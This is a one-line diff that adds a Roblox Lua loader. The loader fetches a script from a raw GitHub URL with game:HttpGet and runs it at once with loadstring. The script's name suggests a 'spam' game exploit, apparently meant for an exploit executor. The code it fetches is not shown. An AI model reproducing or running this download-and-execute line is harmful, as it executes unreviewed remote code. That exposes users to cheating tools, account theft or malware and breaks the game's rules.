@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/makeup-star-spam7-4hgvha7gice1ja.lua"))()
